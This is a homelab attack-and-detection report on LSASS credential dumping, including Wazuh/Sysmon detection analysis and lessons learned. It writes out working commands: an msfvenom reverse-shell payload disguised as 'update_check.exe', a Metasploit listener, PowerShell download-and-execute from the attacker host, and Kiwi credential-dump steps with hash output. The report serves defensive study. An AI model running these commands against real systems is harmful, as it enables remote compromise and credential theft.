# Attack Report: T1003.001 — LSASS Memory Credential Dumping

**Date:** 2026-11-09 to 2026-11-10 (multi-session, see Incident 008)  
**ATT&CK ID:** T1003.001  
**Technique:** OS Credential Dumping — LSASS Memory  
**Tactic:** Credential Access  
**Tools:** Metasploit Framework (msfvenom, multi/handler), Kiwi
(Metasploit's embedded Mimikatz)  
**Attacker:** Kali Linux — 192.168.2.40 (ATTACKNET segment)  
**Target:** Windows 10 Evaluation — 192.168.1.30 (labnet segment)  
**Detection result:** FULL (after Sysmon configuration fix — see
troubleshooting-log/008)  
**Ground truth timestamp:** Logged via `gtruth`, see
scenario-001.csv  

---

## Technique Description

LSASS (Local Security Authority Subsystem Service) is a Windows
process that enforces security policy and temporarily holds
authentication credential material in memory — NTLM password hashes,
Kerberos tickets, and in some configurations plaintext passwords (via
the WDigest provider). Every successful logon on a machine leaves
traces in LSASS memory for as long as that session or a related
process remains active.

T1003.001 is the single most consequential technique in a typical
ransomware or domain-compromise attack chain. An attacker who
successfully dumps LSASS converts "code execution on one endpoint"
into "credentials for the entire domain," enabling lateral movement
via Pass-the-Hash (reusing an NTLM hash directly without cracking it)
or direct credential reuse of a recovered plaintext password. This is
the mechanism behind the lateral movement phase of nearly every major
ransomware incident.

Mimikatz, created by Benjamin Delpy, is the tool most strongly
associated with this technique. This attack uses Metasploit's Kiwi
extension, which embeds Mimikatz directly into a Meterpreter session,
rather than deploying standalone Mimikatz — this keeps the entire
attack chain (delivery, execution, escalation, credential extraction)
within one framework.

---

## Attack Chain Overview

Unlike the single-command techniques tested earlier in Phase 3
(T1046, T1110, T1059.001), this attack required a full staged
compromise:

1. Generate a Meterpreter reverse shell payload
2. Start a Metasploit listener on Kali
3. Deliver the payload to Windows 10 via HTTP and execute it
4. Confirm initial access and privilege level
5. Escalate privileges to SYSTEM
6. Dump credentials from both the SAM database and live LSASS memory
7. Verify SIEM detection

## Pre-Attack Setup

### Payload generation

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.2.40 LPORT=4444 \
  -f exe -o /tmp/update_check.exe
```

Payload size: 509 bytes raw, 7680 bytes as a compiled Windows PE
executable. Named `update_check.exe` to mimic a plausible benign
filename, as a real phishing payload would be disguised.

### Listener setup

```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.2.40
set LPORT 4444
exploit -j -z
```

### Delivery and execution

Payload hosted via Python's built-in HTTP server on Kali:

```bash
cd /tmp
python3 -m http.server 8080
```

Downloaded and executed from Windows 10:

```powershell
Invoke-WebRequest -Uri "http://192.168.2.40:8080/update_check.exe" `
  -OutFile "$env:TEMP\update_check.exe"
Start-Process "$env:TEMP\update_check.exe"
```

Notably, Windows Defender did not block this unsigned reverse-shell
executable at any point in this sequence, despite Tamper Protection
being enabled — an observed gap in endpoint prevention worth noting
independently of the SIEM detection analysis below.

### Network path note

This attack crossed the pfSense firewall under the broad pre-existing
"Allow all LAN traffic" rule (source: LAN subnets, destination: any),
which permits Windows 10 to reach ATTACKNET without restriction —
distinct from the tightly-controlled, explicit ATTACKNET-to-labnet
rules built for Kali's outbound attacks. This asymmetric segmentation
(restrictive one direction, permissive the other) is a documented
architectural finding; see architecture/network-topology.md.

## Attack Execution

### Session establishment

```
[*] Meterpreter session 1 opened (192.168.2.40:4444 -> 192.168.1.30:53993)
```

```
meterpreter > getuid
Server username: HOMELAB\Administrator
```

The payload executed with domain Administrator privileges — the
account that launched it was already elevated, a realistic scenario
representing what happens when a privileged user falls victim to a
phishing payload.

### Credential dump attempt #1 — insufficient privilege

```
meterpreter > load kiwi
meterpreter > creds_all
[!] Not running as SYSTEM, execution may fail
```

Despite running as domain Administrator, live LSASS memory access was
refused. This is an important technical distinction: Administrator is
a high-privilege *user* account, while LSASS's protected process
status on modern Windows requires the operating system's own internal
SYSTEM account for live memory reads. Administrator privilege alone is
not automatically sufficient.

### Fallback — SAM database extraction (T1003.002, related technique)

```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
basia:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
labuser:1002:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
...
```

`hashdump` succeeded immediately without privilege escalation, because
it reads encrypted hashes from the on-disk SAM registry hive rather
than live process memory — a related but technically distinct
technique (commonly classified as T1003.002), requiring only registry
read permissions.

### Privilege escalation

```
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Metasploit's built-in `getsystem` command succeeded via Named Pipe
Impersonation — one of several automatic Windows privilege escalation
techniques it attempts. This technique briefly creates and deletes a
randomly-named Windows service as part of its token manipulation,
which produced a distinct forensic artefact observed in Wazuh (see
Detection Analysis below).

### Credential dump attempt #2 — full success

```
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials

msv credentials
Username       Domain   NTLM
Administrator  HOMELAB  77778e5677ededb06a491d58ea34770a
tk             HOMELAB  77778e5677ededb06a491d58ea34770a
WINDOWS10DESKTO$  HOMELAB  79f9aee29500c3e07649f6ab71a3f4e4

kerberos credentials
Username       Domain       Password
Administrator  HOMELAB.LAB  AdminLab@2026
```

With SYSTEM privileges, Kiwi successfully extracted live LSASS memory
contents. Two results are of particular significance:

**Identical NTLM hashes for Administrator and tk** — indicating shared
credentials or that the `tk` account session retained Administrator's
authentication material, either way representing a Pass-the-Hash risk
across accounts.

**Plaintext domain Administrator password recovered via Kerberos
credential caching**: `AdminLab@2026`. WDigest caching was correctly
disabled (returned null, as expected on this Windows version), but
Kerberos credential material in LSASS retained the plaintext password
in this session. This is the most severe possible outcome of this
technique — a plaintext credential valid for authentication to every
machine in the homelab.lab domain, including the Domain Controller.

## SIEM Detection Analysis

### Initial result: ZERO detections

The first full attack run (privilege escalation and credential dump)
produced no Sysmon Event ID 10 (ProcessAccess) entries whatsoever,
either locally on Windows 10 or in Wazuh. Full diagnostic investigation
is documented in
[troubleshooting-log/008](../../troubleshooting-log/008-sysmon-processaccess-empty-rule.md).

Root cause: the SwiftOnSecurity Sysmon configuration deployed in
Phase 2 ships with ProcessAccess monitoring intentionally disabled by
default via an empty include rule group, to avoid the high log volume
of unrestricted process memory access monitoring.

### Fix summary

A targeted rule was added to a complete, merged Sysmon configuration
file (Sysmon's `-c` command always performs a full replace, never a
merge, so a minimal supplemental file would have discarded the entire
existing ruleset — this was discovered and corrected during the fix):

```xml
<ProcessAccess onmatch="include">
    <TargetImage condition="end with">lsass.exe</TargetImage>
</ProcessAccess>
```

### Post-fix detection — full chain re-executed

**Local Sysmon verification (Windows 10, bypassing Wazuh):**

```
TimeCreated : 11/10/2026 7:06:04 AM
Id          : 10
SourceImage: C:\Users\ADMINI~1\AppData\Local\Temp\update_check.exe
TargetImage: C:\WINDOWS\system32\lsass.exe
GrantedAccess: 0x1010
SourceUser: HOMELAB\Administrator
TargetUser: NT AUTHORITY\SYSTEM
```

`GrantedAccess: 0x1010` combines `PROCESS_VM_READ` (0x0010) and
`PROCESS_QUERY_INFORMATION` (0x1000) — the specific Windows access
rights mask Mimikatz/Kiwi requests to read credential material from
LSASS memory. This is a well-documented, specific indicator rather
than a generic process interaction.

### Rule analysis

**Rule 92900 (level 12) — the primary result.** This is a precise,
named, intent-specific detection: Wazuh parsed the Sysmon ProcessAccess
event, recognised the access mask and target process combination, and
generated an alert stating plainly "possible credential dump." This is
qualitatively different from the indirect, side-effect detections seen
in earlier Phase 3 techniques (e.g. T1046's reliance on Windows error
event spikes) — this rule directly names the technique.

**Rules 92052, 92307, 61138 (levels 3-5) — privilege escalation
artefacts.** The `getsystem` Named Pipe Impersonation technique
creates and deletes a randomly-named Windows service (`wqtflc` in this
run) as part of its token manipulation. Wazuh correctly flagged both
the anomalous command prompt spawn and the registry evidence of
service creation. These rules, triggered in an earlier session during
the same investigation, provide corroborating evidence of the
escalation step even independent of the final LSASS alert.

**Rules 202/203/204 — agent queue pressure recurrence.** The buffer
tuning from Incident 007 (10000 queue, 1000 events/sec) provided
sufficient headroom for the critical LSASS event to land before queue
pressure began, but pressure still recurred under the sustained burst
of rapid Meterpreter commands. This is a genuine finding for the
merged roadmap's resource-cost research track: ten simultaneously
collecting channels (per agent.conf) combined with heavy attack
simulation activity approaches the practical ceiling of this buffer
configuration on constrained hardware.

## Detection Verdict

**FULL** — Following the Sysmon configuration fix, Wazuh produces a
specific, named, high-severity (level 12) alert directly identifying
LSASS credential dumping by process, access mask, and target, stating
the technique in plain language ("possible credential dump"). This is
the strongest single-rule detection result in Phase 3 to date.

## Lessons Learned

**Privilege escalation is a necessary and detectable precondition.**
The `getsystem` step was not incidental — live LSASS memory access
genuinely required it, and the escalation itself left forensic
artefacts (service creation, abnormal process spawn) that a SOC
analyst would see before the credential dump even occurred. A
detection strategy that only watches for the final LSASS access misses
an earlier opportunity to intervene.

**Community Sysmon configurations encode deliberate tradeoffs, not
just defaults.** The empty ProcessAccess block was not a bug — it was
a documented, intentional choice to avoid overwhelming log volume.
Understanding why a high-value detection is switched off by default
is as important as knowing how to enable it, and deploying any
community security configuration requires reading it for silent no-ops,
not just active rules.

**Configuration management tooling has sharp edges.** Sysmon's
full-replace (not merge) behaviour on configuration updates is easy to
trigger by accident while making a small, targeted change, and the
consequence — silently losing unrelated detection coverage — is not
immediately obvious without explicit before/after verification.

**Credential material retention varies by configuration and session
state.** WDigest caching was correctly absent (disabled, as expected
on this Windows version), yet Kerberos credential caching still
exposed a plaintext password. Relying on a single hardening control
(disabling WDigest) is insufficient; LSASS retains credential material
through multiple independent authentication packages, each with its
own exposure surface.

## SA Market Relevance

LSASS credential dumping is the central technique in the lateral
movement phase of nearly every major ransomware incident affecting
South African organisations, including the banking and healthcare
sectors specifically named in Joint Standard 2's scope. A SOC analyst
who can explain the difference between SAM database extraction
(T1003.002, succeeds with Administrator privilege) and live LSASS
memory access (T1003.001, requires SYSTEM) — and who understands why
`0x1010` is a specific, named indicator rather than a generic access
event — demonstrates exactly the depth of technical understanding that
distinguishes a credible SOC Analyst candidate from one who has only
run a tool without understanding its mechanics.
